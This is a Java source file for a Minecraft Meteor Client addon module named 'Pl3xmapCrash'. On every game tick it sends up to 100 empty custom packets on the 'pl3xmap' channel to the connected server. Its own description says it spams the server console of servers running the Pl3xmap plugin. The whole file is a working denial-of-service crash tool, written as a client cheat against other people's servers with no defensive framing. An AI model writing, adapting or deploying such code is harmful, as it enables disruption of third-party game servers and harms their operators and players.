package addon.antip2w.modules.crash;

import addon.antip2w.modules.Categories;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;

//TODO: Remove?
public class Pl3xmapCrash extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> power = sgGeneral.add(new IntSetting.Builder()
        .name("power")
        .description("packets sent in a tick")
        .range(1, 100)
        .defaultValue(6)
        .build()
    );

    private final Setting<Boolean> toggleOnLeave = sgGeneral.add(new BoolSetting.Builder()
        .name("toggle-on-leave")
        .defaultValue(true)
        .build()
    );

    public Pl3xmapCrash() {
        super(Categories.WIP, "Pl3xmapCrash", "Spams the console as fuck if the server has pl3xmap.");
    }

    @EventHandler
    private void onTick(TickEvent.Post tickEvent) {
        if(mc.getNetworkHandler() == null) return;

        for (int i = 0; i < power.get(); i++)
            mc.getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new CustomPayload() {
                @Override
                public void write(PacketByteBuf buf) {
                    //buf.writeInt(3); // protocol number
                    //buf.writeInt(0); // map mode
                    //buf.writeInt(1); // map id

                    //but we don't need these because it's a funny packet
                }

                @Override
                public Identifier id() {
                    return new Identifier("pl3xmap", "pl3xmap");
                }
            }));
    }

    @EventHandler
    private void onLeave(GameLeftEvent event) {
        if (toggleOnLeave.get()) toggle();
    }
}
